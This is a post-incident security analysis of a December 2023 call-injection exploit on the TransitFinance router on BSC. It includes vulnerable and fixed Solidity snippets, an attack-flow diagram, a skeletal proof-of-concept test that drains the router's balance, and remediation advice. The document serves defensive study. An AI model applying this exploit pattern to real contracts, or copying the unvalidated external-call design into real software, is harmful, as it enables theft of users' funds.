# TransitFinance Call Injection Vulnerability Analysis (December 2023)

## Metadata

| Field | Details |
|------|------|
| Date | 2023-12-16 |
| Protocol | TransitFinance |
| Chain | BSC |
| Loss | ~173 BNB |
| Attack Tx | 0x93ae5f0a121d5e1aadae052c36bc5ecf2d406d35222f4c6a5d63fef1d6de1081 |
| Vulnerable Contract | TransitFinance Router |
| Root Cause | Arbitrary External Call (Call Injection) |
| PoC Source | https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/TransitFinance_exp.sol |

---

## 1. Vulnerability Overview

The TransitFinance router used user-supplied parameters in external contract calls without validation, enabling a call injection attack. The attacker leveraged the USD balance held by the router ($43,841) to extract approximately 173 BNB.

---

## 2. Vulnerable Code Analysis

### ❌ Vulnerable Code
```solidity
struct ExactInputV3SwapParams {
    address srcToken;
    address dstToken;
    // ... other parameters
    address router;     // user-specified router
    bytes data;         // user-specified calldata
}

function exactInputV3Swap(ExactInputV3SwapParams calldata params) external {
    // Arbitrary contract call with no input validation
    (bool success, bytes memory result) = params.router.call(params.data);
    // Router balance becomes the attack target
}
```

### ✅ Fixed Code
```solidity
// Whitelist of allowed routers
mapping(address => bool) public allowedRouters;

function exactInputV3Swap(ExactInputV3SwapParams calldata params) external {
    require(allowedRouters[params.router], "Router not allowed");
    // Only verified routers are called
    (bool success,) = params.router.call(params.data);
    require(success, "Swap failed");
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Arbitrary External Call (Call Injection)
// Source code unverified — based on bytecode analysis
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─▶ Check TransitFinance router balance
  │    └─▶ Confirm $43,841 USD held
  │
  ├─▶ Construct malicious ExactInputV3SwapParams
  │    ├─▶ router: attacker contract
  │    └─▶ data: calldata to transfer router balance
  │
  ├─▶ Call exactInputV3Swap()
  │    └─▶ Attacker contract called without validation
  │         └─▶ Router balance drained
  │
  └─▶ Realize profit of 173 BNB
```

---

## 4. PoC Code (Key Section, English Comments)

```solidity
function testExploit() external {
    emit log_named_decimal_uint(
        "Balance BNB before attack", address(this).balance, 18
    );
    emit log_named_decimal_uint(
        "Balance USD of router",
        USDC.balanceOf(address(transitRouter)), 18
    );

    // Construct ExactInputV3SwapParams — specify arbitrary router
    ExactInputV3SwapParams memory params = ExactInputV3SwapParams({
        // router: set to attacker contract
        // data: calldata to drain router balance
    });

    // Execute call injection
    ITransitRouter(transitRouter).exactInputV3Swap(params);

    emit log_named_decimal_uint(
        "Balance BNB after attack", address(this).balance, 18
    );
    // 173 BNB acquired
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| Vulnerability Type | Arbitrary External Call (Call Injection) |
| Attack Vector | User-supplied router parameter |
| Impact Scope | Entire TransitFinance router balance |
| Severity | Critical |

---

## 6. Remediation Recommendations

1. **Router Whitelist**: Restrict calls to approved router addresses only
2. **Keep Router Balance at Zero**: Prohibit asset retention in the router contract
3. **Calldata Validation**: Verify calldata signature or format prior to execution

---

## 7. Lessons Learned

TransitFinance suffered a similar call injection attack in 2022. The recurrence of the same vulnerability demonstrates that the combination of holding assets in a router contract and permitting arbitrary external calls is a critical design flaw. Routers must not hold assets, and all external call targets must be managed via a whitelist.